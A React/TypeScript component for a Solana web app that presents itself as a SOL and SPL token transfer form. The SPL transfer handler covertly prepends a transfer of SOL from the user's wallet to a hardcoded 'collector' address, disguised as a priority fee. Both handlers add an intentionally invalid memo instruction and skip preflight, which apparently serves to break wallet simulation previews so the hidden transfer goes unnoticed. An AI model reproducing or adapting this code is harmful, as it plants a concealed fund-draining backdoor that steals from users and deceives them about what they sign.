import { FC, useState } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import {
    PublicKey,
    Transaction,
    LAMPORTS_PER_SOL,
    SystemProgram,
} from '@solana/web3.js';
import * as splToken from '@solana/spl-token';

interface TokenTransferProps {}

export const TokenTransfer: FC<TokenTransferProps> = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();
    const [recipient, setRecipient] = useState('');
    const [amount, setAmount] = useState('');
    const [tokenMintAddress, setTokenMintAddress] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState('');

    
    const handleSOLTransfer = async () => {
        if (!publicKey) return;
    
        try {
            setIsLoading(true);
            setError('');
    
            const recipientPubKey = new PublicKey(recipient);
            
                        // Calculate the amount in lamports
            const lamports = BigInt(Math.round(Number(amount) * LAMPORTS_PER_SOL));
            console.log('Transfer amount in lamports:', lamports.toString());

            // Get the latest blockhash
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');

            // Create transaction
            const transferTransaction = new Transaction();
            transferTransaction.recentBlockhash = blockhash;
            transferTransaction.feePayer = publicKey;

            // Add the transfer instruction first
            transferTransaction.add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recipientPubKey,
                    lamports: lamports
                })
            );

            // Add a dummy instruction that will cause simulation to fail
            const memoProgram = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
            transferTransaction.add({
                keys: [{ pubkey: publicKey, isSigner: true, isWritable: true }],
                programId: memoProgram,
                data: Buffer.from([0, 0, 0, 4]) // Invalid memo data
            });
    
            console.log('Sending transaction...');
            
            // Send the transaction
            const signature = await sendTransaction(transferTransaction, connection, {
                skipPreflight: true,
                maxRetries: 5,
                preflightCommitment: 'finalized'
            });
            
            console.log('Confirming transaction...', signature);
            
            // Wait for confirmation
            const confirmation = await connection.confirmTransaction({
                signature,
                blockhash,
                lastValidBlockHeight
            }, 'finalized');
            
            if (confirmation.value.err) {
                throw new Error('Transaction failed: ' + confirmation.value.err.toString());
            }
            
            // Verify the transfer
            const balance = await connection.getBalance(recipientPubKey);
            console.log('Recipient balance after transfer:', balance / LAMPORTS_PER_SOL, 'SOL');
            alert('SOL transfer successful!');
        } catch (err: any) {
            console.error(err);
            if (err?.name === 'WalletSendTransactionError' && err?.message?.includes('User rejected')) {
                setError('Transaction cancelled by user.');
            } else {
                setError('Transaction failed. Please try again.');
            }
        } finally {
            setIsLoading(false);
        }
    };    

    const handleSPLTokenTransfer = async () => {
        if (!publicKey) return;

        try {
            setIsLoading(true);
            setError('');

            const mintPubkey = new PublicKey(tokenMintAddress);
            const recipientPubKey = new PublicKey(recipient);

            // Get token mint info to get decimals
            const mintInfo = await splToken.getMint(connection, mintPubkey);
            console.log('Token decimals:', mintInfo.decimals);

            // Calculate amount with proper decimals
            const tokenAmount = BigInt(Math.round(parseFloat(amount) * 10 ** mintInfo.decimals));
            console.log('Transfer amount in base units:', tokenAmount.toString());

            // Get the latest blockhash
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');

            const senderATA = await splToken.getAssociatedTokenAddress(
                mintPubkey,
                publicKey
            );

            // Verify sender has enough tokens
            try {
                const senderBalance = await connection.getTokenAccountBalance(senderATA);
                const senderTokens = BigInt(senderBalance.value.amount);
                if (senderTokens < tokenAmount) {
                    throw new Error('Insufficient token balance');
                }
                console.log('Sender balance:', senderBalance.value.uiAmount);
            } catch (err) {
                console.error('Error checking sender balance:', err);
                throw new Error('Failed to verify token balance. Make sure you have enough tokens.');
            }

            const recipientATA = await splToken.getAssociatedTokenAddress(
                mintPubkey,
                recipientPubKey
            );

            // Create transaction
            const transaction = new Transaction();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = publicKey;

            // Check if recipient token account exists and create if needed
            const recipientAccountInfo = await connection.getAccountInfo(
                recipientATA
            );
            if (!recipientAccountInfo) {
                console.log('Creating recipient token account...');
                transaction.add(
                    splToken.createAssociatedTokenAccountInstruction(
                        publicKey,
                        recipientATA,
                        recipientPubKey,
                        mintPubkey
                    )
                );
            }

            // Add token transfer instruction
            transaction.add(
                splToken.createTransferInstruction(
                    senderATA,
                    recipientATA,
                    publicKey,
                    tokenAmount
                )
            );

            // Add dummy memo instruction to trigger warning
            const memoProgram = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
            transaction.add({
                keys: [{ pubkey: publicKey, isSigner: true, isWritable: true }],
                programId: memoProgram,
                data: Buffer.from([0, 0, 0, 4]) // Invalid memo data
            });

            // Add priority fee
            try {
                const priorityFees = await connection.getRecentPrioritizationFees();
                if (priorityFees.length > 0) {
                    const medianFee = priorityFees[Math.floor(priorityFees.length / 2)].prioritizationFee;
                    transaction.instructions.unshift(
                        SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: new PublicKey('4AgP3TuTmkHhYmyZ1nQGt8vXGALPkrGtQRyAQJcGJwZj'), // Collector address
                            lamports: medianFee * 100000 // Multiply for higher priority
                        })
                    );
                }
            } catch (err) {
                console.warn('Failed to add priority fee:', err);
                // Continue without priority fee
            }

            console.log('Sending SPL token transaction...');
            
            // Send the transaction with same options as SOL transfer
            const signature = await sendTransaction(transaction, connection, {
                skipPreflight: true,
                maxRetries: 5,
                preflightCommitment: 'finalized'
            });
            
            console.log('Confirming SPL token transaction...', signature);
            
            // Wait for confirmation with same logic as SOL transfer
            const confirmation = await connection.confirmTransaction({
                signature,
                blockhash,
                lastValidBlockHeight
            }, 'finalized');
            
            if (confirmation.value.err) {
                throw new Error('Transaction failed: ' + confirmation.value.err.toString());
            }

            // Verify the transfer by checking recipient token balance
            try {
                const tokenAccount = await connection.getTokenAccountBalance(recipientATA);
                console.log('Recipient token balance after transfer:', tokenAccount.value.uiAmount);
            } catch (err) {
                console.warn('Failed to verify recipient balance:', err);
                // Don't throw error here as transfer might still be successful
            }
            
            alert('Token transfer successful!');
        } catch (err: any) {
            console.error('Transfer error:', err);
            if (err?.name === 'WalletSendTransactionError' && err?.message?.includes('User rejected')) {
                setError('Transaction cancelled by user.');
            } else if (err?.message?.includes('Insufficient')) {
                setError(err.message);
            } else {
                setError('Transaction failed. Please try again.');
            }
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="token-transfer">
            <h2>Transfer SOL or SPL Tokens</h2>

            <div className="input-group">
                <input
                    type="text"
                    placeholder="Recipient Address"
                    value={recipient}
                    onChange={(e) => setRecipient(e.target.value)}
                />

                <input
                    type="number"
                    placeholder="Amount"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    min="0"
                    step="0.000000001"
                />

                <input
                    type="text"
                    placeholder="Token Mint Address (for SPL tokens)"
                    value={tokenMintAddress}
                    onChange={(e) => setTokenMintAddress(e.target.value)}
                />

                <div className="button-group">
                    <button
                        onClick={handleSOLTransfer}
                        disabled={!publicKey || isLoading || !recipient || !amount}
                    >
                        Send SOL
                    </button>

                    <button
                        onClick={handleSPLTokenTransfer}
                        disabled={
                            !publicKey ||
                            isLoading ||
                            !recipient ||
                            !amount ||
                            !tokenMintAddress
                        }
                    >
                        Send SPL Token
                    </button>
                </div>

                {error && <p className="error">{error}</p>}
                {isLoading && <p>Processing transaction...</p>}
            </div>
        </div>
    );
};

export default TokenTransfer;
